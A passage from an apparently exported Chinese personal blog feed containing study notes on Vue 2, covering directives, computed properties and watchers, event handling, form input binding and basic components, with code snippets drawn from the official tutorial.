<h5 id="动态参数"><a href="#动态参数" class="headerlink" title="动态参数"></a>动态参数</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a v-bind:[attributeName]&#x3D;&quot;url&quot;&gt; ... &lt;&#x2F;a&gt;   &#x2F;&#x2F; attributeName 会作为一个 JavaScript 表达式进行动态求值</span><br><span class="line">&lt;a v-on:[eventName]&#x3D;&quot;doSomething&quot;&gt; ... &lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
<span class="emoji" alias="warning" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/26a0.png?v8">&#x26a0;</span> 需要注意的地方：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a v-bind:[&#39;foo&#39; + bar]&#x3D;&quot;value&quot;&gt; ... &lt;&#x2F;a&gt;   &#x2F;&#x2F; 编译警告</span><br><span class="line">&lt;a v-bind:[someAttr]&#x3D;&quot;value&quot;&gt; ... &lt;&#x2F;a&gt;  &#x2F;&#x2F; 浏览器会将 attribute 名全部强制转换为小写</span><br></pre></td></tr></table></figure>
<h5 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form v-on:submit.prevent&#x3D;&quot;onSubmit&quot;&gt;...&lt;&#x2F;form&gt; &#x2F;&#x2F; 对于触发的事件调用 event.preventDefault()</span><br></pre></td></tr></table></figure>
<h5 id="缩写"><a href="#缩写" class="headerlink" title="缩写"></a>缩写</h5><span class="emoji" alias="one" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8">&#x0031;&#xfe0f;&#x20e3;</span> <code>v-bind</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- 完整语法 --&gt;</span><br><span class="line">&lt;a v-bind:href&#x3D;&quot;url&quot;&gt;...&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 缩写 --&gt;</span><br><span class="line">&lt;a :href&#x3D;&quot;url&quot;&gt;...&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 动态参数的缩写 --&gt;</span><br><span class="line">&lt;a :[key]&#x3D;&quot;url&quot;&gt; ... &lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
<span class="emoji" alias="two" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8">&#x0032;&#xfe0f;&#x20e3;</span> <code>v-on</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!-- 完整语法 --&gt;</span><br><span class="line">&lt;a v-on:click&#x3D;&quot;doSomething&quot;&gt;...&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 缩写 --&gt;</span><br><span class="line">&lt;a @click&#x3D;&quot;doSomething&quot;&gt;...&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 动态参数的缩写 --&gt;</span><br><span class="line">&lt;a @[event]&#x3D;&quot;doSomething&quot;&gt; ... &lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
<h3 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h3><span class="emoji" alias="one" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8">&#x0031;&#xfe0f;&#x20e3;</span> for example:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;example&quot;&gt;</span><br><span class="line">  &lt;p&gt;Original message: &quot;&#123;&#123; message &#125;&#125;&quot;&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;p&gt;Computed reversed message: &quot;&#123;&#123; reversedMessage &#125;&#125;&quot;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var vm &#x3D; new Vue(&#123;</span><br><span class="line">  el: &#39;#example&#39;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    message: &#39;Hello&#39;</span><br><span class="line">  &#125;,</span><br><span class="line">  computed: &#123;</span><br><span class="line">    &#x2F;&#x2F; 计算属性的 getter</span><br><span class="line">    reversedMessage: function () &#123;</span><br><span class="line">      &#x2F;&#x2F; &#96;this&#96; 指向 vm 实例</span><br><span class="line">      return this.message.split(&#39;&#39;).reverse().join(&#39;&#39;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">console.log(vm.reversedMessage) &#x2F;&#x2F; &#x3D;&gt; &#39;olleH&#39;</span><br><span class="line">vm.message &#x3D; &#39;Goodbye&#39;</span><br><span class="line">console.log(vm.reversedMessage) &#x2F;&#x2F; &#x3D;&gt; &#39;eybdooG&#39;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 使用 methods 可以达到同样的效果</span><br><span class="line">methods: &#123;</span><br><span class="line">      reversedMessage: function() &#123;</span><br><span class="line">          return this.message.split(&#39;&#39;).reverse().join(&#39;&#39;)</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">console.log(vm.reversedMessage())   &#x2F;&#x2F; &#x3D;&gt; &#39;olleH&#39;</span><br></pre></td></tr></table></figure>
<h4 id="🌀-计算属性缓存-VS-方法"><a href="#🌀-计算属性缓存-VS-方法" class="headerlink" title="🌀 计算属性缓存 VS 方法"></a>🌀 计算属性缓存 VS 方法</h4><blockquote>
<p><span class="emoji" alias="one" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8">&#x0031;&#xfe0f;&#x20e3;</span> 计算属性是基于它们的响应式依赖进行缓存的; 只在响应式依赖发生改变它们才会重新求值;<br><span class="emoji" alias="two" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8">&#x0032;&#xfe0f;&#x20e3;</span> 方法：每当触发重新渲染，调用方法总会再次执行函数</p>
</blockquote>
<h4 id="🌀-侦听器"><a href="#🌀-侦听器" class="headerlink" title="🌀 侦听器"></a>🌀 侦听器</h4><blockquote>
<p>数据变化时执行异步或开销较大的操作时</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">div id&#x3D;&quot;watch-example&quot;&gt;</span><br><span class="line">  &lt;p&gt;</span><br><span class="line">    Ask a yes&#x2F;no question:</span><br><span class="line">    &lt;input v-model&#x3D;&quot;question&quot;&gt;</span><br><span class="line">  &lt;&#x2F;p&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123; answer &#125;&#125;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- 因为 AJAX 库和通用工具的生态已经相当丰富，Vue 核心代码没有重复 --&gt;</span><br><span class="line">&lt;!-- 提供这些功能以保持精简。这也可以让你自由选择自己更熟悉的工具。 --&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;axios@0.12.0&#x2F;dist&#x2F;axios.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;lodash@4.13.1&#x2F;lodash.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var watchExampleVM &#x3D; new Vue(&#123;</span><br><span class="line">  el: &#39;#watch-example&#39;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    question: &#39;&#39;,</span><br><span class="line">    answer: &#39;I cannot give you an answer until you ask a question!&#39;</span><br><span class="line">  &#125;,</span><br><span class="line">  watch: &#123;</span><br><span class="line">    &#x2F;&#x2F; 如果 &#96;question&#96; 发生改变，这个函数就会运行</span><br><span class="line">    question: function (newQuestion, oldQuestion) &#123;</span><br><span class="line">      this.answer &#x3D; &#39;Waiting for you to stop typing...&#39;</span><br><span class="line">      this.debouncedGetAnswer()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  created: function () &#123;</span><br><span class="line">    &#x2F;&#x2F; &#96;_.debounce&#96; 是一个通过 Lodash 限制操作频率的函数。</span><br><span class="line">    &#x2F;&#x2F; 在这个例子中，我们希望限制访问 yesno.wtf&#x2F;api 的频率</span><br><span class="line">    &#x2F;&#x2F; AJAX 请求直到用户输入完毕才会发出。想要了解更多关于</span><br><span class="line">    &#x2F;&#x2F; &#96;_.debounce&#96; 函数 (及其近亲 &#96;_.throttle&#96;) 的知识，</span><br><span class="line">    &#x2F;&#x2F; 请参考：https:&#x2F;&#x2F;lodash.com&#x2F;docs#debounce</span><br><span class="line">    this.debouncedGetAnswer &#x3D; _.debounce(this.getAnswer, 500)</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    getAnswer: function () &#123;</span><br><span class="line">      if (this.question.indexOf(&#39;?&#39;) &#x3D;&#x3D;&#x3D; -1) &#123;</span><br><span class="line">        this.answer &#x3D; &#39;Questions usually contain a question mark. ;-)&#39;</span><br><span class="line">        return</span><br><span class="line">      &#125;</span><br><span class="line">      this.answer &#x3D; &#39;Thinking...&#39;</span><br><span class="line">      var vm &#x3D; this</span><br><span class="line">      axios.get(&#39;https:&#x2F;&#x2F;yesno.wtf&#x2F;api&#39;)</span><br><span class="line">        .then(function (response) &#123;</span><br><span class="line">          vm.answer &#x3D; _.capitalize(response.data.answer)</span><br><span class="line">        &#125;)</span><br><span class="line">        .catch(function (error) &#123;</span><br><span class="line">          vm.answer &#x3D; &#39;Error! Could not reach the API. &#39; + error</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>







</li>
</ul>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>深入 - Vue 之事件处理</title>
    <url>/2021/01/21/vue-learn-3/</url>
    <content><![CDATA[<h3 id="💥-事件处理"><a href="#💥-事件处理" class="headerlink" title="💥 事件处理"></a>💥 事件处理</h3><h4 id="🌟-可以使用-v-on-指令监听-DOM-事件"><a href="#🌟-可以使用-v-on-指令监听-DOM-事件" class="headerlink" title="🌟 可以使用 v-on 指令监听 DOM 事件"></a>🌟 可以使用 <code>v-on</code> 指令监听 <code>DOM</code> 事件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;example&quot;&gt;</span><br><span class="line">  &lt;button v-on:click&#x3D;&quot;counter +&#x3D; 1&quot;&gt;Add 1&lt;&#x2F;button&gt;</span><br><span class="line">  &lt;p&gt;The button above has been clicked &#123;&#123; counter &#125;&#125; times.&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var example &#x3D; new Vue(&#123;</span><br><span class="line">  el: &#39;#example&#39;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    counter: 0</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h4 id="🌟-事件处理方法"><a href="#🌟-事件处理方法" class="headerlink" title="🌟 事件处理方法"></a>🌟 事件处理方法</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;example&quot;&gt;</span><br><span class="line">  &lt;button v-on:click&#x3D;&quot;addCounter&quot;&gt;Add 1&lt;&#x2F;button&gt;</span><br><span class="line">  &lt;p&gt;The button above has been clicked &#123;&#123; counter &#125;&#125; times.&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var example &#x3D; new Vue(&#123;</span><br><span class="line">  el: &#39;#example&#39;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    counter: 0</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">      addCounter: function(event) &#123;</span><br><span class="line">          this.counter++;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h4 id="🌟-内联方法"><a href="#🌟-内联方法" class="headerlink" title="🌟 内联方法"></a>🌟 内联方法</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;example&quot;&gt;</span><br><span class="line">  &lt;button v-on:click&#x3D;&quot;add(1)&quot;&gt;Add 1&lt;&#x2F;button&gt;</span><br><span class="line">  &lt;p&gt;The button above has been clicked &#123;&#123; counter &#125;&#125; times.&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var example &#x3D; new Vue(&#123;</span><br><span class="line">  el: &#39;#example&#39;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    counter: 0</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">      add: function(num) &#123;</span><br><span class="line">          this.counter++;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>🐞 有时需要在内联语句中访问原始的 <code>DOM</code> 事件，可以使用特殊变量 <code>$event</code> 把它传入方法：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;button v-on:click&#x3D;&quot;warn(&#39;Form cannot be submitted yet.&#39;, $event)&quot;&gt;</span><br><span class="line">  Submit</span><br><span class="line">&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure>
<h3 id="💥-事件修饰符"><a href="#💥-事件修饰符" class="headerlink" title="💥 事件修饰符"></a>💥 事件修饰符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- 阻止单击事件继续传播 --&gt;</span><br><span class="line">&lt;a v-on:click.stop&#x3D;&quot;doThis&quot;&gt;&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 提交事件不再重载页面 --&gt;</span><br><span class="line">&lt;form v-on:submit.prevent&#x3D;&quot;onSubmit&quot;&gt;&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 修饰符可以串联 --&gt;</span><br><span class="line">&lt;a v-on:click.stop.prevent&#x3D;&quot;doThat&quot;&gt;&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 只有修饰符 --&gt;</span><br><span class="line">&lt;form v-on:submit.prevent&gt;&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 添加事件监听器时使用事件捕获模式 --&gt;</span><br><span class="line">&lt;!-- 即内部元素触发的事件先在此处理，然后才交由内部元素进行处理 --&gt;</span><br><span class="line">&lt;div v-on:click.capture&#x3D;&quot;doThis&quot;&gt;...&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 只当在 event.target 是当前元素自身时触发处理函数 --&gt;</span><br><span class="line">&lt;!-- 即事件不是从内部元素触发的 --&gt;</span><br><span class="line">&lt;div v-on:click.self&#x3D;&quot;doThat&quot;&gt;...&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 点击事件将只会触发一次 --&gt;</span><br><span class="line">&lt;a v-on:click.once&#x3D;&quot;doThis&quot;&gt;&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 滚动事件的默认行为 (即滚动行为) 将会立即触发 --&gt;</span><br><span class="line">&lt;!-- 而不会等待 &#96;onScroll&#96; 完成  --&gt;</span><br><span class="line">&lt;!-- 这其中包含 &#96;event.preventDefault()&#96; 的情况 --&gt;</span><br><span class="line">&lt;div v-on:scroll.passive&#x3D;&quot;onScroll&quot;&gt;...&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<h3 id="💥-按键修饰符"><a href="#💥-按键修饰符" class="headerlink" title="💥 按键修饰符"></a>💥 按键修饰符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- 只有在 &#96;key&#96; 是 &#96;Enter&#96; 时调用 &#96;vm.submit()&#96; --&gt;</span><br><span class="line">&lt;input v-on:keyup.enter&#x3D;&quot;submit&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 只会在 $event.key 等于 PageDown 时被调用--&gt;</span><br><span class="line">&lt;input v-on:keyup.page-down&#x3D;&quot;onPageDown&quot;&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>🐞 后续可能会有所补充，具体情况再补充……</p>
</blockquote>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>深入 - Vue 之表单处理</title>
    <url>/2021/01/24/vue-learn-4/</url>
    <content><![CDATA[<h3 id="💥-表单输入绑定"><a href="#💥-表单输入绑定" class="headerlink" title="💥 表单输入绑定"></a>💥 表单输入绑定</h3><blockquote>
<p>使用 <code>v-model</code> 指令在表单 <code>&lt;input&gt;</code>、<code>&lt;textarea&gt;</code>、<code>&lt;select&gt;</code> 元素上创建双向绑定, 但要<strong>注意</strong>:  </p>
<blockquote>
<p>🐞 <code>v-model</code> 忽略所有表单元素的 <code>value</code>、<code>checkd</code>、<code>selected</code> 的初始值而将组件中的 <code>data</code> 选项声明的初始值作为数据来源<br><code>v-model</code> 针对不同的标签使用不同的 <code>property</code> 和事件：</p>
</blockquote>
</blockquote>
<ul>
<li>text / textarea 使用 <code>value</code> property 和 <code>input</code> 事件</li>
<li>checkbox / radio 使用 <code>checked</code> property 和 <code>change</code> 事件</li>
<li>select 使用 <code>value</code> property 和 <code>change</code> 事件<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;example&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">id</span>=<span class="string">&quot;jack&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Jack&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;checkedNames&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;jack&quot;</span>&gt;</span>Jack<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">id</span>=<span class="string">&quot;john&quot;</span> <span class="attr">value</span>=<span class="string">&quot;John&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;checkedNames&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;john&quot;</span>&gt;</span>John<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>Checked names: &#123;&#123; checkedNames &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">&#x27;#example&#x27;</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        checkNames: []</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
🌀 <span color="red">在一般的 <code>html</code> 中, 我们把复选框的 <code>name</code> 属性作为标识, 在 <code>vue</code> 中就用 <code>v-model</code> 代替它, <code>v-model</code> 里的都是 <code>data</code> 里的东西</span><br><br><br><h4 id="v-bind-实现-property-动态绑定"><a href="#v-bind-实现-property-动态绑定" class="headerlink" title="v-bind 实现 property 动态绑定"></a><code>v-bind</code> 实现 property 动态绑定</h4><span class="emoji" alias="one" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8">&#x0031;&#xfe0f;&#x20e3;</span> 单选按钮<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;radio&quot; v-model&#x3D;&quot;pick&quot; v-bind:value&#x3D;&quot;a&quot;&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 当选中时</span><br><span class="line">vm.pick &#x3D;&#x3D;&#x3D; vm.a</span><br></pre></td></tr></table></figure>
<span class="emoji" alias="two" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8">&#x0032;&#xfe0f;&#x20e3;</span> 选择框的选项<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;select v-model&#x3D;&quot;selected&quot;&gt;</span><br><span class="line">    &lt;!-- 内联对象字面量 --&gt;</span><br><span class="line">  &lt;option v-bind:value&#x3D;&quot;&#123; number: 123 &#125;&quot;&gt;123&lt;&#x2F;option&gt;</span><br><span class="line">&lt;&#x2F;select&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 当选中时</span><br><span class="line">typeof vm.selected &#x2F;&#x2F; &#x3D;&gt; &#39;object&#39;</span><br><span class="line">vm.selected.number &#x2F;&#x2F; &#x3D;&gt; 123</span><br></pre></td></tr></table></figure>
<h4 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h4><blockquote>
<p>使用修饰符：<code>v-model.##</code></p>
</blockquote>
</li>
<li><code>.lazy</code>: <code>v-model</code> 在每次 <code>input</code> 事件触发后将输入框的值与数据进行同步, 添加 <code>.lazy</code> 后转为在 <code>change</code> 事件之后同步</li>
<li><code>.number</code>: 将用户输入值转为数值类型</li>
<li><code>.trim</code>: 自动过滤用户输入的首尾空白字符<br></li>
</ul>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>初识 Vue 组件</title>
    <url>/2021/01/24/vue-learn-5/</url>
    <content><![CDATA[<h3 id="💥-初—自定义组件"><a href="#💥-初—自定义组件" class="headerlink" title="💥 初—自定义组件"></a>💥 初—自定义组件</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Vue.component(<span class="string">&#x27;button-counter&#x27;</span>, &#123;</span><br><span class="line">  data: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      count: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  template: <span class="string">&#x27;&lt;button v-on:click=&quot;count++&quot;&gt;You clicked me &#123;&#123; count &#125;&#125; times.&lt;/button&gt;&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>🛠 总结:  </p>
<ul>
<li>组件名使用 <code>MyComponentName</code> / <code>my-component-name</code> 两种命名方式;</li>
<li>现在就可以使用 <code>button--counter</code> 自定义元素了;</li>
<li>以上述为例, 每个 <code>button-counter</code> 会独自维护它的 <code>count</code> ;  </li>
<li>一个组件的 <code>data</code> 必须是一个函数 =&gt; 每个实例可以维护一份返回对象的独立的拷贝;</li>
</ul>
</blockquote>
<h3 id="💥-中—prop-向子组件传递数据"><a href="#💥-中—prop-向子组件传递数据" class="headerlink" title="💥 中—prop 向子组件传递数据"></a>💥 中—<code>prop</code> 向子组件传递数据</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Vue.component(<span class="string">&#x27;blog-post&#x27;</span>, &#123;</span><br><span class="line">  props: [<span class="string">&#x27;title&#x27;</span>],</span><br><span class="line">  template: <span class="string">&#x27;&lt;h3&gt;&#123;&#123; title &#125;&#125;&lt;/h3&gt;&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 这样就可以使用 title 属性了 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">blog-post</span> <span class="attr">title</span>=<span class="string">&quot;My journey with Vue&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">blog-post</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>🛠 总结:</p>
<ul>
<li><code>prop</code> 可任意多</li>
<li>一个 <code>prop</code> 注册后, 就可以作为一个 <code>attribute</code> 传进来<br>  
  某个组件需要的 `prop` 太多, 让它变成单独的`post` prop:  
</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- 原来的 --&gt;</span><br><span class="line">&lt;blog-post</span><br><span class="line">  v-for&#x3D;&quot;post in posts&quot;</span><br><span class="line">  v-bind:key&#x3D;&quot;post.id&quot;</span><br><span class="line">  v-bind:title&#x3D;&quot;post.title&quot;</span><br><span class="line">  v-bind:content&#x3D;&quot;post.content&quot;</span><br><span class="line">&gt;&lt;&#x2F;blog-post&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 重构后的 --&gt;</span><br><span class="line">&lt;blog-post</span><br><span class="line">  v-for&#x3D;&quot;post in posts&quot;</span><br><span class="line">  v-bind:key&#x3D;&quot;post.id&quot;</span><br><span class="line">  v-bind:post&#x3D;&quot;post&quot;</span><br><span class="line">&gt;&lt;&#x2F;blog-post&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 对应重构后的组件定义 --&gt;</span><br><span class="line">Vue.component(&#39;blog-post&#39;, &#123;</span><br><span class="line">  props: [&#39;post&#39;],</span><br><span class="line">  template: &#96;</span><br><span class="line">    &lt;div class&#x3D;&quot;blog-post&quot;&gt;</span><br><span class="line">      &lt;h3&gt;&#123;&#123; post.title &#125;&#125;&lt;&#x2F;h3&gt;</span><br><span class="line">      &lt;div v-html&#x3D;&quot;post.content&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  &#96;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="💥-监听子组件事件"><a href="#💥-监听子组件事件" class="headerlink" title="💥 监听子组件事件"></a>💥 监听子组件事件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- html 内容 --&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;blog-posts-events-demo&quot;&gt;</span><br><span class="line">  &lt;div :style&#x3D;&quot;&#123; fontSize: postFontSize + &#39;em&#39; &#125;&quot;&gt;</span><br><span class="line">    &lt;blog-post</span><br><span class="line">      v-on:enlarge-text&#x3D;&quot;postFontSize +&#x3D; 0.1&quot;</span><br><span class="line">      v-for&#x3D;&quot;post in posts&quot;</span><br><span class="line">      v-bind:key&#x3D;&quot;post.id&quot;</span><br><span class="line">      v-bind:post&#x3D;&quot;post&quot;</span><br><span class="line">    &gt;&lt;&#x2F;blog-post&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;!-- 父组件通过 v-on 监听子组件--&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 先注册自定义组件</span><br><span class="line">Vue.component(&#39;blog-post&#39;, &#123;</span><br><span class="line">  props: [&#39;post&#39;],</span><br><span class="line">  template: &#96;</span><br><span class="line">    &lt;div class&#x3D;&quot;blog-post&quot;&gt;</span><br><span class="line">      &lt;h3&gt;&#123;&#123; post.title &#125;&#125;&lt;&#x2F;h3&gt;</span><br><span class="line">      &lt;button v-on:click&#x3D;&quot;$emit(&#39;enlarge-text&#39;)&quot;&gt;</span><br><span class="line">        Enlarge text</span><br><span class="line">      &lt;&#x2F;button&gt;</span><br><span class="line">      &lt;div v-html&#x3D;&quot;post.content&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  &#96;</span><br><span class="line">&#125;)</span><br><span class="line">&#x2F;&#x2F; 子组件通过 &#96;$emit&#96;方法传入事件名称并触发</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 创建 Vue 实例</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &#39;#blog-posts-events-demo&#39;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    posts: [&#123;id: 1, title: &#39;haha&#39;, content: &#39;hiahia&#39;&#125;],</span><br><span class="line">    postFontSize: 1</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>🐞 当然也可以以传入参数的方式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 父组件 --&gt;</span></span><br><span class="line">v-on:enlarge-text=&quot;postFontSize += $event&quot;</span><br><span class="line"><span class="comment">&lt;!-- 子组件 --&gt;</span></span><br><span class="line">v-on:click=&quot;$emit(&#x27;enlarge-text&#x27;, 0.1)&quot;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>🌟 注意是 <code>$event</code> !  </p>
</blockquote>
